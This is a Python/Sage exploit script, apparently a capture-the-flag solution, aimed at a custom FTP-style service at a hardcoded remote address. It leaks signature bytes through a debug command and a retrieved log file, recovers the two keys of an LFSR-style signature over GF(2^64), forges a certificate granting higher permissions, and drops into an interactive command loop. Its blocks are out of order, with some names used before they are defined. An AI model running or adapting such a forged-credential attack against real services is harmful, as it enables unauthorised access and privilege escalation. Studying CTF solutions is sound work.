import binascii
user = "anon"
perms = 2
cert = "user=" + user + "&perms=" + str(perms)
print(cert)
len_cert = len(cert)
nb_seg = len_cert // 8

def reverse(v):
    ad = ""
    for i in range(0,len(v),2):
        ad += v[len(v)-i-2: len(v)-i]
    return ad

certs = []

for i in range(nb_seg):
    param = cert[i*8:i*8 + 8]
    param_hex = binascii.hexlify(param.encode()).decode()
    param_hex = reverse(param_hex)
    certs.append(int(param_hex,16))
    
    
if (len_cert > nb_seg*8):
    param = cert[nb_seg*8:len_cert]
    param_hex = binascii.hexlify(param.encode()).decode()
    param_hex = reverse(param_hex)
    certs.append(int(param_hex,16))
    
C =  Integer(certs[0]) 
C2 = Integer(0x0000000000000000) 
K1= Integer(0x7b)
K2= Integer(0x01c8)

C_bf = K._cache.fetch_int(C)
C2_bf = K._cache.fetch_int(C2)
k2_bf = K2
k1_bf = K1

R_bf = C_bf * k1_bf # lfsr(c, k1)
R_bf = R_bf + C2_bf # xor(C1, p2)
R_bf = R_bf * k1_bf # lfsr(c2, k1)
R_bf = R_bf + k2_bf # xor(c3, k2)
R_bf = R_bf * k1_bf # lfsr( c4 , k1)

for i in range(1,len(certs)):

    C = Integer(certs[i]) 

    C_bf = K._cache.fetch_int(C)
    C2_bf = R_bf

    R_bf = C_bf * k1_bf # lfsr(c, k1)
    R_bf = R_bf + C2_bf # xor(C1, p2)
    R_bf = R_bf * k1_bf # lfsr(c2, k1)
    R_bf = R_bf + k2_bf # xor(c3, k2)
    R_bf = R_bf * k1_bf # lfsr( c4 , k1)


R4 = R_bf.integer_representation()
cert = cert.encode() + b"&sig=" + str(R4).encode()
print(cert)
cert = f"CERT {base64.b64encode(cert).decode()}"  
print(cert)

from pwn import *
import time
import binascii

import warnings
warnings.filterwarnings('ignore')

REMOTE = True
local_pasv = 33344



payload_leak =b"anonanonanonanon"


if REMOTE:
    p = remote("62.210.131.87", 31337)
else:
    p = remote("127.0.0.1" , 31337)

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())

p.sendline(b"DBG\n")
time.sleep(0.5)

p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
time.sleep(0.5)
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")

time.sleep(0.5)

print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))
print(pasv.recvuntil(payload_leak))

leak = pasv.recvline()
print(leak)
leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex = binascii.hexlify(leak)
print(f"LEAK = {leak_hex}")
print(f"SIGUSER (anon +1) = {leak_hex[0:16]}")

print(pasv.recvuntil(b"ftp.log"))

pasv.close()
time.sleep(2)

p.sendline("CERT dXNlcj1hbm9ueW1vdXMmcGVybXM9MSZzaWc9JZwSUYC422Y=".encode())

time.sleep(0.5)
print(p.recvuntil(b"Invalid signature\n"))

p.sendline(b"USER anonymous\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anonymous\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())


payload_leak =b"anonymousaaaaaaaaaaaaaaaa"

p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"PASS anonymous\n")

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
time.sleep(0.5)
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")

time.sleep(0.5)

print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))

print(pasv.recvline())


pasv.recvuntil(b"anonymousaaaaaaa")
leak = pasv.recvline()

leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex_2 = binascii.hexlify(leak)
print(f"LEAK = {leak_hex_2}")
print(f"SIGUSER (anonymous +1) = {leak_hex_2[0:16]}")

L1 = leak_hex[0:16].decode()
L2 = leak_hex_2[0:16].decode()

L1_i = ""
L2_i = ""

for i in range(0,16,2):
    L1_i += L1[16-i-2: 16-i]

for i in range(0,16,2):
	L2_i += L2[16-i-2: 16-i]
	
print("anon LEAK1 / anon LEAK 2 -> ", L1_i, L2_i)

import base64

P = 0xb73cf44702000000 #taps in LFSR
Debug = True
GF2.<x> = GF(2)[]
K = GF(2^64);

a21 = Integer(int(L1_i, 16)) #output1
a21_ = K._cache.fetch_int(a21)
a22 = Integer(int(L2_i,16)) #output2
a22_ = K._cache.fetch_int(a22)
a11 = Integer(0x0000006e6f6e6101) #entry1
a11_ = K._cache.fetch_int(a11)
a12 = Integer(0x6f6d796e6f6e6101) #entry2
a12_ = K._cache.fetch_int(a12)


a21ma22 = a21_ + a22_
R = a21ma22.integer_representation()
a11ma12 = a11_ + a12_
R2 = a11ma12.integer_representation()



print("a11-a12 = ",hex(R2))
print("a21-a22 = ",hex(R))

R0 = a21ma22 / a11ma12
R3 = R0.integer_representation()
print(hex(R3))


k1 = R0.nth_root(3, all=True) 

    
#(a11*k1² + k2)*k1 = a21
#(a11*k1² + k2) = a21/k1
# k2 = a21/k1 - a11 * k1²

#(a11*k1² + k2)*k1 = a21
#(a11*k1² + k2) = a21/k1
# k2 = a21/k1 - a11 * k1²
print()
i=0
for v in k1:
    a21dk1 = (a21_ / v)
    a = a21dk1.integer_representation()
    a11k1carre = a11_ * v * v
    a = a11k1carre.integer_representation()
    
    k2 = a21dk1 - a11k1carre
    a = k2.integer_representation()
    ab = v.integer_representation()
    print("(K1,K2) = ", (a,ab))
    
    ################################################
    
    C =  Integer(0x6f6e613d72657375) # entry of LFSR
    C2 = Integer(0x0000000000000000) # entry of LFSR
    K1= v # key1
    K2= k2 # key2

    C_bf = K._cache.fetch_int(C)
    C2_bf = K._cache.fetch_int(C2)
    k2_bf = K2
    k1_bf = K1

    R_bf = C_bf * k1_bf # lfsr(c, k1)
    R_bf = R_bf + C2_bf # xor(C1, p2)
    R_bf = R_bf * k1_bf # lfsr(c2, k1)
    R_bf = R_bf + k2_bf # xor(c3, k2)
    R_bf = R_bf * k1_bf # lfsr( c4 , k1)
    
    #first R
    
    C = Integer(0x3d736d726570266e) # entry of LFSR
    
    C_bf = K._cache.fetch_int(C)
    C2_bf = R_bf
    
    R_bf = C_bf * k1_bf # lfsr(c, k1)
    R_bf = R_bf + C2_bf # xor(C1, p2)
    R_bf = R_bf * k1_bf # lfsr(c2, k1)
    R_bf = R_bf + k2_bf # xor(c3, k2)
    R_bf = R_bf * k1_bf # lfsr( c4 , k1)
    
    C = Integer(0x32) # entry of LFSR
    C_bf = K._cache.fetch_int(C)
    C2_bf = R_bf
    
    R_bf = C_bf * k1_bf # lfsr(c, k1)
    R_bf = R_bf + C2_bf # xor(C1, p2)
    R_bf = R_bf * k1_bf # lfsr(c2, k1)
    R_bf = R_bf + k2_bf # xor(c3, k2)
    R_bf = R_bf * k1_bf # lfsr( c4 , k1)
    
    R4 = R_bf.integer_representation()
    #print(hex(R4))
    #R4 = int(input("r4>"),16)
    cert= f"user=anon&perms=2&sig={R4}".encode()
    cert = f"CERT {base64.b64encode(cert).decode()}"
    print("sending :", cert)
    p.sendline(cert.encode())
    a = p.recvline()
    print(a)
    if (i==0):
        a = p.recvline()
    i += 1
    if b"Ok" in a:
        break
        
print("Got a New account with perms=2")
while True:
    de = input("command?>")
    p.sendline(de.encode())
    print(p.recvline())
    
